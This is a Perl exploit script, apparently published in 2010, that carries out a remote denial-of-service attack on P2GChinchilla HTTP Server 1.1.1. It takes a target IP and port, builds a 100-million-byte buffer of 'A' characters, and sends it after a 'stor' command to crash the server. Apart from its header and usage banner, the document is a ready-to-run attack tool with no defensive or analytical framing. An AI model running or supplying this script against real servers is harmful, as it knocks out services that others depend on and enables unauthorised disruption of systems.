#!/usr/bin/perl
# File Name :P2GChinchilla[TM] HTTP Server
# Vuln : Remote Denial Of Service Exploit
# Auther : Zer0 Thunder
# Msn : zer0_thunder@colombohackers.com
#
# 
##==------>>
#
# Exploit Title: P2GChinchilla[TM] HTTP Server 1.1.1 Remote Denial Of Service Exploit
# Date: 22/01/2010
# Author: Zer0 Thunder
# Version: v 1.1.1
# Tested on: Server runs on Windows XP Sp2 /Test on Remote Location
##==------>> 
use IO::Socket::INET;
$ip = $ARGV[0];
$port = $ARGV[1];
if (! defined $ARGV[0])
{
print "\t+================================================================+\n";
print "\t+ ---  P2GChinchilla[TM] HTTP Server 1.1.1 Denial Of Service  ---+\n";
print "\t+ ---  Author :Zer0 Thunder                                   ---+\n";
print "\t+ ---  DATE:  :[24/01/2010]                                   ---+\n";
print "\t+ ---  ------------------------------------------------       ---+\n";
print "\t+ ---  Usage  :perl exploit.pl [Host/Remote IP] [Port]        ---+\n";
print "\t+ ---                                                         ---+\n";
print "\t+================================================================+\n";
print "\n"; 
print " Ex : exploit.pl localhost 50000\n";  # P2GChinchilla Default Port is 50000
 
 
exit;
}
 
print "\t+================================================================+\n";
print "\t+ ---  P2GChinchilla[TM] HTTP Server 1.1.1 Denial Of Service  ---+\n";
print "\t+ ---  Author :Zer0 Thunder                                   ---+\n";
print "\t+ ---  DATE:  :[24/01/2010]                                   ---+\n";
print "\t+ ---  ------------------------------------------------       ---+\n";
print "\t+ ---  Usage  :perl exploit.pl [Host/Remote IP] [Port]        ---+\n";
print "\t+ ---                                                         ---+\n";
print "\t+================================================================+\n";
print "\n";  
print " Wait Till The Buffer is Done\n"; 
my $b1 = "\x41" x 100000000;
print "\n";
print " DoS is UP !.. N Give it a Second \n";

$DoS=IO::Socket::INET->new("$ip:$port") or die;

print $DoS "stor $b1\n";
print $DoS "QUIT\n";
 
close $DoS;

# exit :